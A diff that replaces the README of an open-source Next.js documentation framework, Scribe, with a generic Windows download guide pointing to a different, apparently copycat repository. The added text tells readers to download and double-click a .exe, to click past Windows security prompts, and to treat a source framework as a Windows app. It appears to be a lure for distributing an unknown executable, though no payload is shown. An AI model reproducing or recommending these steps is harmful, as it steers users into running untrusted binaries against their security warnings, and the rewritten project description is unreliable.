@@ -1,180 +1,232 @@
-<div align="center">
+# 📘 Scribe - Clear docs with no lock-in
 
-<img src="public/scribe-logo.svg" alt="Scribe" width="72" height="72" />
+[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge)](https://github.com/linellalternative892/Scribe)
 
-# Scribe
+## 🚀 Getting Started
 
-**Beautiful documentation, zero vendor lock-in.**
+Scribe is a docs app for people who want clean, easy-to-read documentation without being tied to one service. It uses Next.js App Router, MDX, and modern UI tools to build a fast docs site.
 
-The open-source alternative to Mintlify — built on Next.js App Router.
+If you want to try it on Windows, use this link:
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Next.js](https://img.shields.io/badge/Next.js-15-black?logo=next.js)](https://nextjs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178c6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.4-38bdf8?logo=tailwindcss&logoColor=white)](https://tailwindcss.com)
+[Download Scribe](https://github.com/linellalternative892/Scribe)
 
-[Demo](https://scribedocs.vercel.app) · [Quick Start](#quick-start) · [Components](#components) · [Configuration](#configuration)
+Follow the steps below to get it running.
 
-</div>
+## 🖥️ What You Need
 
-<br />
+Before you start, make sure your Windows PC has:
 
-<img src="public/screenshots/full-page-dark.png" alt="Scribe — dark mode documentation" width="100%" />
+- Windows 10 or Windows 11
+- A stable internet connection
+- 4 GB of RAM or more
+- At least 500 MB of free disk space
+- A web browser such as Edge, Chrome, or Firefox
 
-<br />
+If Scribe comes with a packaged Windows app or release file, save it to your Downloads folder. If it comes as source files, you can still run it with the included setup steps on the repository page.
 
----
+## 📥 Download Scribe
 
-## Quick Start
+1. Open this page:
+   [https://github.com/linellalternative892/Scribe](https://github.com/linellalternative892/Scribe)
 
-```bash
-git clone https://github.com/RapierCraft/scribe.git my-docs
-cd my-docs && npm install
-npm run dev
-```
+2. Look for the latest release, download link, or release assets.
 
-Open [http://localhost:3000/docs](http://localhost:3000/docs). Your first page is at `src/app/docs/page.mdx`.
+3. Download the file for Windows if one is listed.
 
----
+4. Save the file in a place you can find again, such as Downloads or Desktop.
 
-## Features
+5. If your browser asks if you want to keep the file, choose to keep it.
 
-#### Components
-| | |
-|---|---|
-| **Callout** | Info, warning, success, and danger blocks with icons |
-| **CodeTabs** | Multi-language examples with syntax highlighting and copy button |
-| **ApiEndpoint** | HTTP method badge, parameter table, request/response examples |
-| **Steps** | Numbered step sequences with optional per-step code |
-| **Cards** | Navigation cards with icons and hover effects |
-| **CodeBlock** | 30+ languages, line highlighting, one-click copy |
+## 🪟 Run on Windows
 
-#### Navigation
-| | |
-|---|---|
-| **Sidebar** | Collapsible groups, badge support, external link indicators |
-| **Search** | Full-text search with keyboard navigation (`/` to open) |
-| **Table of Contents** | Auto-generated, scroll-tracking active state |
-| **Version Switcher** | Dropdown to switch between API versions |
+1. Open the folder where you saved Scribe.
 
-#### Developer Experience
-| | |
-|---|---|
-| **Single config file** | Everything in `scribe.config.ts` — no scattered env vars |
-| **MDX support** | Drop any component directly into `.mdx` pages |
-| **shadcn/ui compatible** | CSS variables wired to shadcn — drop in any component |
-| **Dark / light mode** | Built-in, zero flash, system preference aware |
-| **Server Components** | App Router native — no legacy React patterns |
+2. If you downloaded a `.exe` file, double-click it to start the app.
 
----
+3. If Windows shows a security prompt, choose the option that lets you run the file.
 
-## Why Scribe?
+4. If you downloaded a zipped file, right-click it and choose Extract All.
 
-|  | Mintlify | Docusaurus | Nextra | Fumadocs | **Scribe** |
-|---|:---:|:---:|:---:|:---:|:---:|
-| **Free** | ✗ | ✓ | ✓ | ✓ | ✓ |
-| **Self-hosted** | ✗ | ✓ | ✓ | ✓ | ✓ |
-| **Next.js App Router** | ✗ | ✗ | ✗ | ✓ | ✓ |
-| **API docs component** | ✓ | ✗ | ✗ | ✗ | ✓ |
-| **Code tabs** | ✓ | Plugin | ✗ | Plugin | ✓ |
-| **Full-text search** | Paid | Plugin | ✓ | ✓ | ✓ |
-| **shadcn/ui compatible** | ✗ | ✗ | ✗ | Partial | ✓ |
-| **Vendor lock-in** | ✓ | ✗ | ✗ | ✗ | ✗ |
+5. Open the extracted folder and start the app from the main file inside.
 
----
+6. If the app opens in your browser, leave that window open while you use it.
 
-## Screenshots
+## ⚙️ First-Time Setup
 
-<table>
-<tr>
-<td width="50%">
-<img src="public/screenshots/hero-dark.png" alt="Dark mode" />
-<p align="center"><sub>Dark mode</sub></p>
-</td>
-<td width="50%">
-<img src="public/screenshots/hero-light.png" alt="Light mode" />
-<p align="center"><sub>Light mode</sub></p>
-</td>
-</tr>
-<tr>
-<td colspan="2">
-<img src="public/screenshots/search-results.png" alt="Built-in search" />
-<p align="center"><sub>Full-text search</sub></p>
-</td>
-</tr>
-</table>
+When Scribe starts for the first time, you may need to:
 
----
+- Choose a project folder
+- Set your docs title
+- Pick a theme
+- Add your first markdown or MDX file
+- Save your changes
 
-## Configuration
+If the app asks for a local address, open it in your browser. This is normal for apps built with Next.js on a local machine.
 
-One file controls everything.
+## ✨ What Scribe Can Do
 
-```typescript
-// scribe.config.ts
-const config: ScribeConfig = {
-  name: "My Product",
-  description: "The fastest way to ship your API.",
-  url: "https://docs.myproduct.com",
-  logo: { light: "/logo-light.svg", dark: "/logo-dark.svg" },
-  theme: { primaryColor: "#6366f1", font: "Inter" },
-  navigation: [
-    {
-      title: "Getting Started",
-      items: [
-        { title: "Introduction", href: "/docs" },
-        { title: "Quick Start", href: "/docs/quickstart" },
-      ],
-    },
-  ],
-  search: { enabled: true, shortcut: "/" },
-  versions: ["v2.0", "v1.9"],
-};
-```
+Scribe is built to help you make documentation that looks clean and stays easy to edit.
 
-Change `primaryColor` and every component updates. Compatible with any shadcn/ui theme.
+### 📝 Write in Markdown and MDX
+Use plain text files for docs, code examples, and notes. Markdown keeps writing simple. MDX lets you add richer content when needed.
 
----
+### 🌙 Light and dark mode
+Switch between light and dark views so the docs are easier to read in different settings.
 
-## Deploy
+### ⚡ Fast page setup
+Scribe uses the Next.js App Router, which helps keep page setup clean and organized.
 
-| Platform | Command |
-|---|---|
-| **Vercel** | `vercel deploy` |
-| **Netlify** | `netlify deploy --build` |
-| **Docker** | `docker build -t my-docs . && docker run -p 3000:3000 my-docs` |
-| **Static** | Add `output: "export"` to `next.config.js`, then `npm run build` |
-| **Self-hosted** | `npm run build && npm start` |
+### 🎨 Modern UI
+The interface uses a simple design with tools like shadcn/ui and Tailwind CSS. That gives the app a neat look without clutter.
 
----
+### 🧩 Flexible docs structure
+You can build docs for:
 
-## Used By
+- API references
+- Product guides
+- Help centers
+- Internal knowledge bases
+- Developer docs
+- Tutorials
 
-*Building something with Scribe? [Open a PR](https://github.com/RapierCraft/scribe/pulls) to add your project here.*
+### 🔓 No vendor lock-in
+Your content stays in open formats. That makes it easier to move your docs later if you change tools.
 
----
+## 📂 Suggested File Layout
 
-## Contributing
+If you are setting up docs in Scribe, a simple structure helps keep things easy to manage:
 
-```bash
-git clone https://github.com/RapierCraft/scribe.git
-cd scribe && npm install && npm run dev
-```
+- `docs/` for your pages
+- `docs/getting-started.md` for the first page
+- `docs/api.md` for API notes
+- `docs/guide.md` for longer help content
+- `public/` for images and icons
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Keep file names short and clear. Use words that match the page topic.
 
----
+## 🧭 Basic Use
 
-## License
+After Scribe is open, you can usually work like this:
 
-[MIT](LICENSE) — use it for anything, forever.
+1. Open your docs folder
+2. Add or edit markdown files
+3. Save your changes
+4. Refresh the page
+5. Check how the page looks in the browser
+6. Repeat until the docs feel right
 
----
+If the app supports a sidebar or page list, use it to keep sections in order.
 
-<div align="center">
+## 🔧 Common Tasks
 
-If Scribe saved you from a $150/mo docs bill, a ⭐ helps others find it.
+### Add a new page
+Create a new markdown file in your docs folder and give it a clear name. Then add the page to your docs list if Scribe uses one.
 
-**[Star on GitHub](https://github.com/RapierCraft/scribe)**
+### Edit a page
+Open the file, change the text, save it, and refresh the site.
 
-</div>
+### Add code examples
+Use fenced code blocks in Markdown. Keep examples short so readers can follow them.
+
+### Add images
+Put image files in the public folder or the folder the app uses for assets. Then link to them from your docs page.
+
+### Change the theme
+Use the theme settings in the app if they are available. Dark mode can help when reading docs at night.
+
+## 🧪 If It Does Not Open
+
+If Scribe does not start on Windows:
+
+1. Check that the file finished downloading
+2. Try running it again
+3. Make sure you extracted all files if it came as a zip
+4. Close and reopen your browser
+5. Restart your PC
+6. Check that Windows did not block the file
+
+If you still cannot open it, visit the GitHub page again and look for a newer release or setup note.
+
+## 📌 Best Use Tips
+
+- Keep page titles short
+- Use one idea per section
+- Write steps in order
+- Use simple words
+- Add examples where needed
+- Use headings so people can scan the page fast
+- Keep code samples clean and short
+
+## 🏷️ Topics
+
+This project fits topics like:
+
+- api-documentation
+- app-router
+- dark-mode
+- developer-tools
+- docs-framework
+- docs-template
+- documentation
+- documentation-tool
+- docusaurus-alternative
+- markdown
+- mdx
+- mintlify-alternative
+- nextjs
+- nextra-alternative
+- open-source
+- react
+- shadcn-ui
+- static-site-generator
+- tailwindcss
+- typescript
+
+## 📄 Project Info
+
+- **Name:** Scribe
+- **Type:** Documentation app
+- **Platform:** Windows
+- **Style:** Clean, modern, open-source docs workflow
+- **Main goal:** Help you build and read docs with less setup
+
+## 🔗 Download and Start
+
+Use this link to download or open the project page:
+
+[https://github.com/linellalternative892/Scribe](https://github.com/linellalternative892/Scribe)
+
+## 🗂️ File Help
+
+If the project includes config files, you may see names like:
+
+- `package.json`
+- `next.config.js`
+- `tsconfig.json`
+- `tailwind.config.js`
+- `mdx-components.tsx`
+
+These files control how the docs app works. You usually do not need to edit them unless you want to change the setup.
+
+## 🧾 Example Docs Content
+
+Here is a simple page structure that works well:
+
+- Overview
+- Install
+- Setup
+- Usage
+- API
+- FAQ
+
+This layout helps readers find what they need fast.
+
+## 🛠️ Simple Editing Flow
+
+1. Open the docs folder
+2. Pick a page
+3. Change the text
+4. Save the file
+5. Refresh the site
+6. Check the result
+7. Keep editing until it looks right
